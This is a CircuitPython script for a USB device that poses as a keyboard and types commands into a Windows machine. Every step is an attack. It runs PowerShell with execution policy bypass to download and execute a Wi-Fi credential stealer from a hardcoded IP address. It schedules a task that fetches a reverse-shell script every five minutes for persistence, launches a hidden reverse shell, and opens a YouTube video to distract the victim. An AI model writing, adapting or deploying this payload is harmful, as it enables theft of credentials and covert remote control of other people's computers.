import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Initialize keyboard
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Wait for HID to be recognized by the system
time.sleep(2)

# Step 1: Open Run dialog
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.5)

# Step 2: Open PowerShell (non-admin)
layout.write("powershell\n")
time.sleep(2)  # Wait for PowerShell to open

# Step 3: Type the PowerShell command to send wifi credentials to the server
powershell_command = 'powershell -ep bypass -c "iex (iwr http://52.202.38.242/wifilogger.ps1)"'
layout.write(powershell_command + "\n")  # Type command and press Enter
time.sleep(1.4)  # Wait for command execution
layout.write("exit\n")  # Close PowerShell

# Step 4: Open Run dialog
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.5)

# Step 5: Open cmd
layout.write("cmd\n")
time.sleep(1.5)

# Step 6: Run this cmd command to schedule task
command = 'schtasks /create /tn "RunReversePowerShell" /tr "cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"iex (iwr \'http://52.202.38.242/reverse.ps1\')\\"" /sc minute /mo 5 /it /f'
layout.write(command + "\n")
time.sleep(1.5)
layout.write("exit\n")

# Step 7: Powershell Reverse Shell
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.6)
layout.write('powershell -WindowStyle Hidden -ep Bypass -c "iex (iwr http://52.202.38.242/reverse.ps1)"\n')
time.sleep(2)

# Step 8: Open a distraction (YouTube video)
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.5)
layout.write("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n")
